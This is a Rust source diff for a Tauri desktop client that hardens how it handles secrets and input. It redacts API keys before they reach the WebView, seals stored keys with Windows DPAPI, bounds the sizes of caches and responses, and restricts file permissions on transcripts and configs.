     let runtime = configured_grok_command(&app);
     let mut command = Command::new(&runtime.path);
-    // Headless media child: only the four media tools are enabled. `--always-approve`
-    // is scoped by that tool allowlist (not full agent yolo). Permission mode is
-    // intentionally media-only; chat permissionMode does not apply to this child.
+    // Headless media child: tool allowlist is a hard constant (never from request).
+    // `--always-approve` only covers these four media tools — not full agent yolo.
+    // Chat `permissionMode` does not apply to this child process.
     command
         .arg("--single")
         .arg(&prompt)
         .args(["--output-format", "streaming-json", "--always-approve"])
-        .args([
-            "--tools",
-            "image_gen,video_gen,image_to_video,reference_to_video",
-        ])
+        .args(["--tools", MEDIA_GENERATION_TOOLS])
         .current_dir(&cwd)
         .stdin(Stdio::null())
         .stdout(Stdio::piped())
@@ -3955,6 +4846,14 @@ fn read_hidden_projects() -> Result<Vec<String>, String> {
 
 #[tauri::command]
 fn write_hidden_projects(ids: Vec<String>) -> Result<(), String> {
+    // R18: bound list size so a compromised webview cannot thrash disk/JSON.
+    const MAX_HIDDEN_PROJECTS: usize = 512;
+    const MAX_HIDDEN_ID_LEN: usize = 256;
+    if ids.len() > MAX_HIDDEN_PROJECTS {
+        return Err(format!(
+            "隐藏项目列表过长（最多 {MAX_HIDDEN_PROJECTS} 项）"
+        ));
+    }
     let path = hidden_projects_path()?;
     if let Some(parent) = path.parent() {
         fs::create_dir_all(parent).map_err(|error| format!("无法创建配置目录：{error}"))?;
@@ -3962,13 +4861,22 @@ fn write_hidden_projects(ids: Vec<String>) -> Result<(), String> {
     let mut unique = ids
         .into_iter()
         .map(|id| id.trim().to_string())
-        .filter(|id| !id.is_empty())
+        .filter(|id| {
+            !id.is_empty()
+                && id.len() <= MAX_HIDDEN_ID_LEN
+                && !id.chars().any(char::is_control)
+        })
         .collect::<Vec<_>>();
     unique.sort();
     unique.dedup();
+    if unique.len() > MAX_HIDDEN_PROJECTS {
+        unique.truncate(MAX_HIDDEN_PROJECTS);
+    }
     let body = serde_json::to_string_pretty(&unique)
         .map_err(|error| format!("无法序列化隐藏项目列表：{error}"))?;
-    atomic_write(&path, &body)
+    atomic_write(&path, &body)?;
+    let _ = restrict_private_file(&path);
+    Ok(())
 }
 
 /// Local UI transcript cache — avoids waiting on full ACP `session/load` when
@@ -4015,12 +4923,21 @@ fn write_session_cache(app: tauri::AppHandle, id: String, content: String) -> Re
             content.len()
         ));
     }
+    // R20: only JSON objects — refuse raw scripts / HTML planted via compromised webview.
+    let parsed: serde_json::Value = serde_json::from_str(&content)
+        .map_err(|error| format!("会话缓存必须是 JSON：{error}"))?;
+    if !parsed.is_object() {
+        return Err("会话缓存必须是 JSON 对象".into());
+    }
     let path = session_cache_path(&app, &id)?;
     if let Some(parent) = path.parent() {
         fs::create_dir_all(parent).map_err(|error| format!("无法创建会话缓存目录：{error}"))?;
     }
     // Dedicated writer: session cache may exceed the 4MB config document cap.
-    atomic_write_bytes(&path, &content, SESSION_CACHE_MAX_BYTES)
+    atomic_write_bytes(&path, &content, SESSION_CACHE_MAX_BYTES)?;
+    // R16: transcripts can hold sensitive chat content — tighten ACL when possible.
+    let _ = restrict_private_file(&path);
+    Ok(())
 }
 
 /// Co-located durable offline transcript (survives app restart; fingerprint-gated).
@@ -4057,13 +4974,12 @@ fn write_ui_transcript(
         },
         "session": session,
     });
-    let body = envelope
-        .to_string();
-    atomic_write_bytes(
-        &ui_transcript_path(session_dir),
-        &body,
-        UI_TRANSCRIPT_MAX_BYTES,
-    )
+    let body = envelope.to_string();
+    let path = ui_transcript_path(session_dir);
+    atomic_write_bytes(&path, &body, UI_TRANSCRIPT_MAX_BYTES)?;
+    // R17: offline transcripts can hold chat content — match session-cache ACL.
+    let _ = restrict_private_file(&path);
+    Ok(())
 }
 
 /// Return cached offline session JSON if fingerprint still matches updates.jsonl.
@@ -4644,6 +5560,10 @@ fn start_offline_session_history(
             let result = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
             let abandoned = || OFFLINE_HISTORY_GEN.load(Ordering::SeqCst) != gen;
             let clear_active = || {
+                // Gen-scoped: a restarted scan for the same id must keep ACTIVE_ID.
+                if OFFLINE_HISTORY_GEN.load(Ordering::SeqCst) != gen {
+                    return;
+                }
                 if let Ok(mut guard) = OFFLINE_HISTORY_ACTIVE_ID.lock() {
                     if guard.as_str() == safe {
                         guard.clear();
@@ -4830,6 +5750,12 @@ fn start_offline_session_history(
             let mut offline_id_seen: std::collections::HashMap<u64, u32> =
                 std::collections::HashMap::new();
             let mut line_i = 0usize;
+            const MAX_SCAN_BLOCKS: usize = 1500;
+            let trim_blocks = |blocks: &mut Vec<serde_json::Value>| {
+                if blocks.len() > MAX_SCAN_BLOCKS {
+                    *blocks = blocks.split_off(blocks.len() - MAX_SCAN_BLOCKS);
+                }
+            };
             let mut last_progress_lines = 0usize;
             let mut last_progress_bytes = 0u64;
             let mut last_progress_at = Instant::now();
@@ -4855,6 +5781,7 @@ fn start_offline_session_history(
                             "text": text,
                             "ts": updated_at,
                         }));
+                        trim_blocks(blocks);
                     }
                 }
             };
@@ -4872,6 +5799,7 @@ fn start_offline_session_history(
                             "streaming": false,
                             "ts": updated_at,
                         }));
+                        trim_blocks(blocks);
                     }
                 }
             };
@@ -5114,11 +6042,7 @@ fn start_offline_session_history(
                             "ts": updated_at,
                             "call": call,
                         }));
-                        // Continuous cap — avoid multi-hundred-MB peaks before final pack.
-                        const MAX_SCAN: usize = 1500;
-                        if blocks.len() > MAX_SCAN {
-                            blocks = blocks.split_off(blocks.len() - MAX_SCAN);
-                        }
+                        trim_blocks(&mut blocks);
                     }
                     "tool_call_update" => {
                         let tool_id = update
@@ -5229,6 +6153,7 @@ fn start_offline_session_history(
                                     "ts": updated_at,
                                     "steps": steps,
                                 }));
+                                trim_blocks(&mut blocks);
                             }
                         }
                     }
@@ -5504,6 +6429,203 @@ fn enrich_tools_from_chat_history(dir: &Path, blocks: &mut [serde_json::Value]) 
     }
 }
 
+/// Placeholder written into Settings drafts so WebView never holds real API keys.
+const CONFIG_SECRET_REDACTED: &str = "********";
+
+fn is_redacted_config_secret(value: &str) -> bool {
+    let v = value.trim().trim_matches('"').trim_matches('\'');
+    v.is_empty()
+        || v == CONFIG_SECRET_REDACTED
+        || v == "[REDACTED]"
+        || v == "[dpapi-sealed]"
+        || v.contains('…')
+}
+
+/// Strip `api_key = "..."` / env-style key lines before config content enters the WebView.
+fn redact_config_document_secrets(content: &str) -> String {
+    content
+        .lines()
+        .map(|line| {
+            let trimmed = line.trim_start();
+            // TOML: api_key = "sk-..."
+            if let Some(rest) = trimmed
+                .strip_prefix("api_key")
+                .or_else(|| trimmed.strip_prefix("API_KEY"))
+            {
+                let rest = rest.trim_start();
+                if rest.starts_with('=') {
+                    let indent_len = line.len() - trimmed.len();
+                    let indent = &line[..indent_len];
+                    return format!("{indent}api_key = \"{CONFIG_SECRET_REDACTED}\"");
+                }
+            }
+            // Rare dotenv-in-toml mistakes
+            if let Some((key, _)) = trimmed.split_once('=') {
+                let key = key.trim();
+                if key.eq_ignore_ascii_case("XAI_API_KEY")
+                    || key.eq_ignore_ascii_case("OPENAI_API_KEY")
+                    || key.eq_ignore_ascii_case("ANTHROPIC_API_KEY")
+                {
+                    let indent_len = line.len() - trimmed.len();
+                    let indent = &line[..indent_len];
+                    return format!("{indent}{key}={CONFIG_SECRET_REDACTED}");
+                }
+            }
+            line.to_string()
+        })
+        .collect::<Vec<_>>()
+        .join("\n")
+}
+
+/// Strip trailing `#` comments from a TOML line (not inside quotes — best-effort).
+fn toml_line_without_comment(line: &str) -> &str {
+    let mut in_single = false;
+    let mut in_double = false;
+    let mut escaped = false;
+    for (i, ch) in line.char_indices() {
+        if escaped {
+            escaped = false;
+            continue;
+        }
+        match ch {
+            '\\' if in_double => escaped = true,
+            '\'' if !in_double => in_single = !in_single,
+            '"' if !in_single => in_double = !in_double,
+            '#' if !in_single && !in_double => return line[..i].trim_end(),
+            _ => {}
+        }
+    }
+    line.trim_end()
+}
+
+/// TOML table header key e.g. `[model.foo]` / `[model."grok-4.5"]` (not array `[[`).
+/// R15: tolerates trailing comments (`[model.foo] # prod`).
+fn toml_table_header_key(trimmed: &str) -> Option<String> {
+    let t = toml_line_without_comment(trimmed).trim();
+    if t.starts_with('[') && t.ends_with(']') && !t.starts_with("[[") {
+        Some(t.to_string())
+    } else {
+        None
+    }
+}
+
+#[cfg(test)]
+fn is_toml_table_header(trimmed: &str) -> bool {
+    toml_table_header_key(trimmed).is_some()
+}
+
+fn parse_toml_api_key_value(trimmed: &str) -> Option<&str> {
+    let rest = trimmed
+        .strip_prefix("api_key")
+        .or_else(|| trimmed.strip_prefix("API_KEY"))?;
+    let rest = rest.trim_start();
+    let val = rest.strip_prefix('=')?.trim();
+    let val = val.trim_matches('"').trim_matches('\'');
+    Some(val)
+}
+
+/// Map TOML table header → real api_key (R14.2: never positional).
+fn collect_api_keys_by_table(content: &str) -> BTreeMap<String, String> {
+    let mut table = String::new();
+    let mut map = BTreeMap::new();
+    for line in content.lines() {
+        let trimmed = line.trim();
+        if let Some(header) = toml_table_header_key(trimmed) {
+            table = header;
+            continue;
+        }
+        if let Some(val) = parse_toml_api_key_value(trimmed) {
+            if !is_redacted_config_secret(val) {
+                map.insert(table.clone(), val.to_string());
+            }
+        }
+    }
+    map
+}
+
+fn collect_env_style_secrets(content: &str) -> BTreeMap<String, String> {
+    let mut map = BTreeMap::new();
+    for line in content.lines() {
+        let trimmed = line.trim();
+        let Some((key, raw)) = trimmed.split_once('=') else {
+            continue;
+        };
+        let key = key.trim();
+        if !(key.eq_ignore_ascii_case("XAI_API_KEY")
+            || key.eq_ignore_ascii_case("OPENAI_API_KEY")
+            || key.eq_ignore_ascii_case("ANTHROPIC_API_KEY"))
+        {
+            continue;
+        }
+        let val = raw.trim().trim_matches('"').trim_matches('\'');
+        if !is_redacted_config_secret(val) {
+            // Normalize key to uppercase so restore is case-insensitive.
+            map.insert(key.to_ascii_uppercase(), val.to_string());
+        }
+    }
+    map
+}
+
+/// When the operator saves a redacted draft, restore secrets **by table header**.
+/// Fail-closed if a redacted `api_key` has no matching table on disk (avoids
+/// wrong-key rebinding after delete/reorder — R14.2 N1).
+fn merge_config_secrets_from_existing(existing: &str, incoming: &str) -> Result<String, String> {
+    let prior_api = collect_api_keys_by_table(existing);
+    let prior_env = collect_env_style_secrets(existing);
+    let mut table = String::new();
+    let mut out: Vec<String> = Vec::new();
+    for line in incoming.lines() {
+        let trimmed = line.trim();
+        if let Some(header) = toml_table_header_key(trimmed) {
+            table = header;
+            out.push(line.to_string());
+            continue;
+        }
+        if let Some(val) = parse_toml_api_key_value(trimmed) {
+            if is_redacted_config_secret(val) {
+                let Some(real) = prior_api.get(&table) else {
+                    let where_table = if table.is_empty() {
+                        "文件顶部（不在任何 TOML 表内）".to_string()
+                    } else {
+                        format!("表 {table}")
+                    };
+                    return Err(format!(
+                        "无法安全恢复密钥：{where_table} 在磁盘上没有对应 api_key（可能已删改模型段）。请重新输入该段的 API Key。"
+                    ));
+                };
+                let indent_len = line.len() - line.trim_start().len();
+                let indent = &line[..indent_len];
+                out.push(format!("{indent}api_key = {}", toml_string(real)));
+                continue;
+            }
+            out.push(line.to_string());
+            continue;
+        }
+        if let Some((key, raw)) = trimmed.split_once('=') {
+            let key_trim = key.trim();
+            if key_trim.eq_ignore_ascii_case("XAI_API_KEY")
+                || key_trim.eq_ignore_ascii_case("OPENAI_API_KEY")
+                || key_trim.eq_ignore_ascii_case("ANTHROPIC_API_KEY")
+            {
+                let val = raw.trim().trim_matches('"').trim_matches('\'');
+                if is_redacted_config_secret(val) {
+                    let Some(real) = prior_env.get(&key_trim.to_ascii_uppercase()) else {
+                        return Err(format!(
+                            "无法安全恢复环境变量密钥 {key_trim}：磁盘上没有对应明文。请重新输入。"
+                        ));
+                    };
+                    let indent_len = line.len() - line.trim_start().len();
+                    let indent = &line[..indent_len];
+                    out.push(format!("{indent}{key_trim}={}", env_value(real)));
+                    continue;
+                }
+            }
+        }
+        out.push(line.to_string());
+    }
+    Ok(out.join("\n"))
+}
+
 #[tauri::command]
 fn read_config_documents(cwd: String) -> Result<Vec<ConfigDocument>, String> {
     let cwd = checked_workspace(&cwd)?;
@@ -5512,11 +6634,22 @@ fn read_config_documents(cwd: String) -> Result<Vec<ConfigDocument>, String> {
         .map(|id| {
             let (path, label, language) = config_path(id, &cwd)?;
             let exists = path.is_file();
+            let raw = if exists {
+                read_bounded_text(&path, MAX_CONFIG_BYTES)?
+            } else {
+                String::new()
+            };
+            // R14.1 B5: never ship plaintext api_key into Settings WebView drafts.
+            let content = if id == "config" {
+                redact_config_document_secrets(&raw)
+            } else {
+                raw
+            };
             Ok(ConfigDocument {
                 id,
                 label,
                 path: path_for_webview(&path),
-                content: read_bounded_text(&path, MAX_CONFIG_BYTES)?,
+                content,
                 exists,
                 language,
             })
@@ -5527,19 +6660,78 @@ fn read_config_documents(cwd: String) -> Result<Vec<ConfigDocument>, String> {
 #[tauri::command]
 fn write_config_document(request: WriteConfigDocument) -> Result<ConfigDocument, String> {
     let cwd = checked_workspace(&request.cwd)?;
-    let (path, label, language) = config_path(&request.id, &cwd)?;
-    atomic_write(&path, &request.content)?;
+    // Validate id before any disk write (config_path also rejects unknown ids).
     let id: &'static str = match request.id.as_str() {
         "config" => "config",
         "system-prompt" => "system-prompt",
         "agents" => "agents",
         _ => return Err("未知配置文档".into()),
     };
+    if request.content.contains('\0') {
+        return Err("配置内容不能包含空字节".into());
+    }
+    // R19: reject oversized drafts before merge/write (atomic_write also caps).
+    if request.content.len() as u64 > MAX_CONFIG_BYTES {
+        return Err(format!(
+            "配置内容过大（{} bytes，上限 {}）",
+            request.content.len(),
+            MAX_CONFIG_BYTES
+        ));
+    }
+    let (path, label, language) = config_path(id, &cwd)?;
+    let to_write = if id == "config" && path.is_file() {
+        // R14.2 N3: fail-closed — never treat unreadable existing as empty
+        // (would flush ******** and wipe real keys).
+        let existing = read_bounded_text(&path, MAX_CONFIG_BYTES)?;
+        merge_config_secrets_from_existing(&existing, &request.content)?
+    } else if id == "config" {
+        // Brand-new config file: refuse pure-redacted placeholders with no disk prior.
+        for line in request.content.lines() {
+            let trimmed = line.trim();
+            if let Some(val) = parse_toml_api_key_value(trimmed) {
+                if is_redacted_config_secret(val) {
+                    return Err(
+                        "新配置不能只含脱敏占位符：请填写真实 API Key，或先激活供应商档案。"
+                            .into(),
+                    );
+                }
+            }
+            // R15: same refuse for env-style secrets on create.
+            if let Some((key, raw)) = trimmed.split_once('=') {
+                let key = key.trim();
+                if key.eq_ignore_ascii_case("XAI_API_KEY")
+                    || key.eq_ignore_ascii_case("OPENAI_API_KEY")
+                    || key.eq_ignore_ascii_case("ANTHROPIC_API_KEY")
+                {
+                    let val = raw.trim().trim_matches('"').trim_matches('\'');
+                    if is_redacted_config_secret(val) {
+                        return Err(
+                            "新配置不能只含脱敏环境变量密钥：请填写真实 API Key，或先激活供应商档案。"
+                                .into(),
+                        );
+                    }
+                }
+            }
+        }
+        request.content.clone()
+    } else {
+        request.content.clone()
+    };
+    atomic_write(&path, &to_write)?;
+    // Home-scoped configs can hold routing / identity-adjacent settings — ACL like creds.
+    if matches!(id, "config" | "system-prompt") {
+        let _ = restrict_private_file(&path);
+    }
     Ok(ConfigDocument {
         id,
         label,
         path: path_for_webview(&path),
-        content: request.content,
+        // Echo redacted form back to the WebView — never the merged plaintext.
+        content: if id == "config" {
+            redact_config_document_secrets(&to_write)
+        } else {
+            to_write
+        },
         exists: true,
         language,
     })
@@ -5549,19 +6741,272 @@ fn provider_profiles_path() -> Result<PathBuf, String> {
     Ok(grok_home()?.join("grox-providers.json"))
 }
 
+/// At-rest marker for DPAPI-sealed API keys in grox-providers.json.
+const SECRET_SEAL_PREFIX: &str = "enc:v1:";
+
+#[cfg(windows)]
+fn dpapi_protect(plain: &[u8]) -> Result<Vec<u8>, String> {
+    use windows::Win32::Foundation::{LocalFree, HLOCAL};
+    use windows::Win32::Security::Cryptography::{CryptProtectData, CRYPT_INTEGER_BLOB};
+
+    if plain.is_empty() {
+        return Ok(Vec::new());
+    }
+    unsafe {
+        let mut input = CRYPT_INTEGER_BLOB {
+            cbData: plain.len() as u32,
+            pbData: plain.as_ptr() as *mut u8,
+        };
+        let mut output = CRYPT_INTEGER_BLOB {
+            cbData: 0,
+            pbData: std::ptr::null_mut(),
+        };
+        CryptProtectData(
+            &mut input,
+            windows::core::PCWSTR::null(),
+            None,
+            None,
+            None,
+            0,
+            &mut output,
+        )
+        .map_err(|error| format!("DPAPI 加密失败：{error}"))?;
+        if output.pbData.is_null() || output.cbData == 0 {
+            return Err("DPAPI 加密返回空数据".into());
+        }
+        let sealed =
+            std::slice::from_raw_parts(output.pbData, output.cbData as usize).to_vec();
+        let _ = LocalFree(HLOCAL(output.pbData as *mut _));
+        Ok(sealed)
+    }
+}
+
+#[cfg(windows)]
+fn dpapi_unprotect(sealed: &[u8]) -> Result<Vec<u8>, String> {
+    use windows::Win32::Foundation::{LocalFree, HLOCAL};
+    use windows::Win32::Security::Cryptography::{CryptUnprotectData, CRYPT_INTEGER_BLOB};
+
+    if sealed.is_empty() {
+        return Ok(Vec::new());
+    }
+    unsafe {
+        let mut input = CRYPT_INTEGER_BLOB {
+            cbData: sealed.len() as u32,
+            pbData: sealed.as_ptr() as *mut u8,
+        };
+        let mut output = CRYPT_INTEGER_BLOB {
+            cbData: 0,
+            pbData: std::ptr::null_mut(),
+        };
+        CryptUnprotectData(
+            &mut input,
+            None,
+            None,
+            None,
+            None,
+            0,
+            &mut output,
+        )
+        .map_err(|error| format!("DPAPI 解密失败：{error}"))?;
+        if output.pbData.is_null() || output.cbData == 0 {
+            return Err("DPAPI 解密返回空数据".into());
+        }
+        let plain =
+            std::slice::from_raw_parts(output.pbData, output.cbData as usize).to_vec();
+        let _ = LocalFree(HLOCAL(output.pbData as *mut _));
+        Ok(plain)
+    }
+}
+
+/// Seal a secret for disk (Windows DPAPI). Non-Windows keeps plaintext (still ACL-limited).
+fn seal_secret_for_storage(plain: &str) -> Result<String, String> {
+    let plain = checked_api_key(plain)?.to_string();
+    if plain.is_empty() {
+        return Ok(String::new());
+    }
+    #[cfg(windows)]
+    {
+        let sealed = dpapi_protect(plain.as_bytes())?;
+        Ok(format!(
+            "{SECRET_SEAL_PREFIX}{}",
+            BASE64.encode(sealed)
+        ))
+    }
+    #[cfg(not(windows))]
+    {
+        Ok(plain)
+    }
+}
+
+/// Unseal a stored secret. Accepts legacy plaintext for migration.
+fn unseal_secret_from_storage(stored: &str) -> Result<String, String> {
+    let stored = stored.trim();
+    if stored.is_empty() {
+        return Ok(String::new());
+    }
+    if let Some(b64) = stored.strip_prefix(SECRET_SEAL_PREFIX) {
+        #[cfg(windows)]
+        {
+            let sealed = BASE64
+                .decode(b64.trim())
+                .map_err(|error| format!("凭据编码损坏：{error}"))?;
+            let plain = dpapi_unprotect(&sealed)?;
+            let text = String::from_utf8(plain)
+                .map_err(|_| "凭据解密后不是有效 UTF-8".to_string())?;
+            return Ok(checked_api_key(&text)?.to_string());
+        }
+        #[cfg(not(windows))]
+        {
+            return Err("此平台无法解密 Windows DPAPI 凭据".into());
+        }
+    }
+    // Legacy plaintext on disk — still validated.
+    Ok(checked_api_key(stored)?.to_string())
+}
+
+/// Redact sealed or raw API key material from operator-facing export dumps.
+fn redact_secret_for_export(value: &str) -> String {
+    let v = value.trim();
+    if v.is_empty() {
+        return String::new();
+    }
+    if v.starts_with(SECRET_SEAL_PREFIX) {
+        return "[dpapi-sealed]".into();
+    }
+    if v.len() <= 8 {
+        return "********".into();
+    }
+    format!("{}…{}", &v[..4], &v[v.len().saturating_sub(2)..])
+}
+
+/// Serializes provider-profile RMW so seal-on-read cannot race a concurrent save
+/// during the atomic write window (R14.1 B6).
+fn provider_profiles_lock() -> &'static StdMutex<()> {
+    static LOCK: StdMutex<()> = StdMutex::new(());
+    &LOCK
+}
+
 fn read_provider_profiles_file() -> Result<ProviderProfilesFile, String> {
+    let _guard = provider_profiles_lock()
+        .lock()
+        .map_err(|_| "供应商档案锁已损坏".to_string())?;
+    read_provider_profiles_file_unlocked()
+}
+
+fn read_provider_profiles_file_unlocked() -> Result<ProviderProfilesFile, String> {
     let path = provider_profiles_path()?;
     if !path.exists() {
         return Ok(ProviderProfilesFile::default());
     }
     let content = read_bounded_text(&path, MAX_CONFIG_BYTES)?;
-    serde_json::from_str(&content)
-        .map_err(|error| format!("无法解析供应商档案 {}：{error}", path.display()))
+    let mut value: ProviderProfilesFile = serde_json::from_str(&content)
+        .map_err(|error| format!("无法解析供应商档案 {}：{error}", path.display()))?;
+    // R12: migrate legacy plaintext keys on first read (not only on save).
+    let needs_seal = value.profiles.iter().any(|profile| {
+        !profile.api_key.is_empty() && !profile.api_key.starts_with(SECRET_SEAL_PREFIX)
+    });
+    if needs_seal {
+        // Hold the same lock — call unlocked writer to avoid deadlock.
+        let _ = write_provider_profiles_file_unlocked(&value);
+        if let Ok(content) = read_bounded_text(&path, MAX_CONFIG_BYTES) {
+            if let Ok(sealed) = serde_json::from_str::<ProviderProfilesFile>(&content) {
+                return Ok(sealed);
+            }
+        }
+        for profile in &mut value.profiles {
+            if profile.api_key.is_empty() || profile.api_key.starts_with(SECRET_SEAL_PREFIX) {
+                continue;
+            }
+            if let Ok(sealed) = seal_secret_for_storage(&profile.api_key) {
+                profile.api_key = sealed;
+            }
+        }
+    }
+    Ok(value)
+}
+
+/// Operator support dump: versions, redacted provider summary, last-exit tail.
+/// Never includes unsealed API keys or full ~/.grok/.env contents.
+#[tauri::command]
+fn export_support_diagnostics() -> Result<String, String> {
+    let profiles = read_provider_profiles_file().unwrap_or_default();
+    let profiles_redacted: Vec<serde_json::Value> = profiles
+        .profiles
+        .iter()
+        .map(|profile| {
+            serde_json::json!({
+                "id": profile.id,
+                "name": profile.name,
+                "hasApiKey": !profile.api_key.is_empty(),
+                "apiKey": redact_secret_for_export(&profile.api_key),
+                "baseUrl": profile.base_url,
+                "apiBackend": profile.api_backend,
+                "residentModels": profile.resident_models,
+                "availableModelCount": profile.available_models.len(),
+            })
+        })
+        .collect();
+
+    let env_status = read_provider_status().ok();
+    let last_exit_tail = {
+        let path = std::env::var("LOCALAPPDATA")
+            .ok()
+            .map(|local| PathBuf::from(local).join("Grox").join("last-exit.log"));
+        match path {
+            Some(path) if path.is_file() => {
+                let text = read_bounded_text(&path, 64 * 1024).unwrap_or_default();
+                text.lines()
+                    .rev()
+                    .take(40)
+                    .collect::<Vec<_>>()
+                    .into_iter()
+                    .rev()
+                    .collect::<Vec<_>>()
+                    .join("\n")
+            }
+            _ => String::new(),
+        }
+    };
+
+    let dump = serde_json::json!({
+        "generatedAtUnix": SystemTime::now()
+            .duration_since(UNIX_EPOCH)
+            .map(|d| d.as_secs())
+            .unwrap_or(0),
+        "clientVersion": CLIENT_VERSION,
+        "buildCommit": GROX_BUILD_COMMIT,
+        "os": std::env::consts::OS,
+        "arch": std::env::consts::ARCH,
+        "activeProviderId": profiles.active_id,
+        "providers": profiles_redacted,
+        "providerStatus": env_status,
+        "lastExitLogTail": last_exit_tail,
+        "notes": [
+            "API keys are redacted or marked [dpapi-sealed]; never paste unredacted dumps.",
+            "Managed ~/.grok/.env secrets are not included in this export.",
+        ],
+    });
+    serde_json::to_string_pretty(&dump).map_err(|error| format!("无法序列化诊断信息：{error}"))
 }
 
 fn write_provider_profiles_file(value: &ProviderProfilesFile) -> Result<(), String> {
+    let _guard = provider_profiles_lock()
+        .lock()
+        .map_err(|_| "供应商档案锁已损坏".to_string())?;
+    write_provider_profiles_file_unlocked(value)
+}
+
+fn write_provider_profiles_file_unlocked(value: &ProviderProfilesFile) -> Result<(), String> {
     let path = provider_profiles_path()?;
-    let content = serde_json::to_string_pretty(value)
+    // Seal any legacy plaintext keys before flush (Windows DPAPI).
+    let mut sealed = value.clone();
+    for profile in &mut sealed.profiles {
+        if profile.api_key.is_empty() || profile.api_key.starts_with(SECRET_SEAL_PREFIX) {
+            continue;
+        }
+        profile.api_key = seal_secret_for_storage(&profile.api_key)?;
+    }
+    let content = serde_json::to_string_pretty(&sealed)
         .map_err(|error| format!("无法序列化供应商档案：{error}"))?;
     atomic_write(&path, &content)?;
     restrict_private_file(&path)
@@ -5583,6 +7028,11 @@ fn provider_profile_summary(profile: &StoredProviderProfile) -> ProviderProfileS
         available_models: profile.available_models.clone(),
         resident_models,
     }
+}
+
+/// Plaintext API key for CLI env / HTTP — unseals DPAPI storage.
+fn profile_api_key_plain(profile: &StoredProviderProfile) -> Result<String, String> {
+    unseal_secret_from_storage(&profile.api_key)
 }
 
 fn compatible_models_url(base_url: &str) -> Result<String, String> {
@@ -5666,17 +7116,24 @@ fn save_provider_profile(request: SaveProviderProfile) -> Result<ProviderProfile
     let existing = request
         .id
         .as_deref()
-        .and_then(|id| value.profiles.iter().find(|profile| profile.id == id));
+        .and_then(|id| value.profiles.iter().find(|profile| profile.id == id))
+        .cloned();
     let current_values = parse_env_file(&grok_home()?.join(".env"));
-    let key = request
+    let existing_plain = existing
+        .as_ref()
+        .map(|profile| unseal_secret_from_storage(&profile.api_key))
+        .transpose()?;
+    let plain_key = request
         .api_key
         .as_deref()
         .map(str::trim)
         .filter(|key| !key.is_empty())
-        .or_else(|| existing.map(|profile| profile.api_key.as_str()))
-        .or_else(|| current_values.get("XAI_API_KEY").map(String::as_str))
+        .map(str::to_owned)
+        .or(existing_plain)
+        .or_else(|| current_values.get("XAI_API_KEY").cloned())
         .ok_or("API Key 不能为空")?;
-    compatible_provider_env(key, &request.base_url, name, request.api_backend)?;
+    let plain_key = checked_api_key(&plain_key)?.to_owned();
+    compatible_provider_env(&plain_key, &request.base_url, name, request.api_backend)?;
     let resident_models = checked_model_ids(request.resident_models)?;
     let id = request.id.unwrap_or_else(|| {
         let nanos = SystemTime::now()
@@ -5693,10 +7150,30 @@ fn save_provider_profile(request: SaveProviderProfile) -> Result<ProviderProfile
     {
         return Err("无效的供应商档案 ID".into());
     }
+    // Keep existing sealed blob when the operator left the key field blank.
+    let stored_key = if request
+        .api_key
+        .as_deref()
+        .map(str::trim)
+        .filter(|k| !k.is_empty())
+        .is_none()
+    {
+        if let Some(existing) = existing.as_ref() {
+            if existing.api_key.starts_with(SECRET_SEAL_PREFIX) {
+                existing.api_key.clone()
+            } else {
+                seal_secret_for_storage(&plain_key)?
+            }
+        } else {
+            seal_secret_for_storage(&plain_key)?
+        }
+    } else {
+        seal_secret_for_storage(&plain_key)?
+    };
     let profile = StoredProviderProfile {
         id: id.clone(),
         name: name.to_owned(),
-        api_key: checked_api_key(key)?.to_owned(),
+        api_key: stored_key,
         base_url: checked_service_url(&request.base_url, "服务地址")?,
         api_backend: request.api_backend,
         models_url: None,
@@ -5723,26 +7200,35 @@ async fn refresh_provider_models(id: String) -> Result<ProviderProfileSummary, S
         .find(|profile| profile.id == id)
         .ok_or("供应商档案不存在")?;
     let endpoint = compatible_models_url(&profile.base_url)?;
-    let response = reqwest::Client::builder()
-        .user_agent(format!("Grox/{CLIENT_VERSION}"))
-        .timeout(Duration::from_secs(15))
-        .build()
-        .map_err(|error| format!("无法创建模型目录客户端：{error}"))?
+    let plain_key = profile_api_key_plain(&profile)?;
+    let response = provider_models_http_client()?
         .get(endpoint)
-        .bearer_auth(&profile.api_key)
+        .bearer_auth(&plain_key)
         .header("Accept", "application/json")
         .send()
         .await
         .map_err(|error| format!("无法获取模型列表：{error}"))?
         .error_for_status()
-        .map_err(|error| format!("模型服务返回错误：{error}"))?
-        .json::<OpenAiModelsResponse>()
+        .map_err(|error| format!("模型服务返回错误：{error}"))?;
+    // R18/R19: cap wire body before JSON parse (hostile provider memory bomb).
+    const MAX_MODELS_BODY_BYTES: usize = 4 * 1024 * 1024;
+    let body = response
+        .bytes()
         .await
+        .map_err(|error| format!("无法读取模型列表：{error}"))?;
+    if body.len() > MAX_MODELS_BODY_BYTES {
+        return Err(format!(
+            "模型列表响应过大（{} bytes，上限 {MAX_MODELS_BODY_BYTES}）",
+            body.len()
+        ));
+    }
+    let response: OpenAiModelsResponse = serde_json::from_slice(&body)
         .map_err(|error| format!("模型列表不是 OpenAI 兼容格式：{error}"))?;
     let mut models = response
         .data
         .into_iter()
         .map(|model| model.id)
+        .filter(|id| !id.is_empty() && id.chars().count() <= 200 && !id.chars().any(char::is_control))
         .collect::<Vec<_>>();
     models.sort_by_key(|model| model.to_ascii_lowercase());
     models.dedup();
@@ -5769,8 +7255,9 @@ fn activate_provider_profile(id: String) -> Result<(), String> {
         .find(|profile| profile.id == id)
         .cloned()
         .ok_or("供应商档案不存在")?;
+    let plain_key = profile_api_key_plain(&profile)?;
     let replacement = compatible_provider_env(
-        &profile.api_key,
+        &plain_key,
         &profile.base_url,
         &profile.name,
         profile.api_backend,
@@ -5876,6 +7363,7 @@ fn configure_provider(request: ProviderConfig) -> Result<(), String> {
         let synthetic = StoredProviderProfile {
             id: "compatible".into(),
             name: "compatible".into(),
+            // In-memory only for config.toml pin — not written to grox-providers.json.
             api_key: checked_api_key(key)?.to_owned(),
             base_url: checked_service_url(base_url, "服务地址")?,
             api_backend: ProviderApiBackend::ChatCompletions,
@@ -5893,21 +7381,42 @@ fn configure_provider(request: ProviderConfig) -> Result<(), String> {
     Ok(())
 }
 
-#[tauri::command]
-fn open_external(url: String) -> Result<(), String> {
-    let parsed = url::Url::parse(&url).map_err(|error| format!("无效链接：{error}"))?;
+/// Parse and validate a browser-open URL (shared by open_external variants).
+fn parse_browser_url(url: &str) -> Result<url::Url, String> {
+    let trimmed = url.trim();
+    if trimmed.is_empty() || trimmed.len() > 8_192 {
+        return Err("链接长度无效".into());
+    }
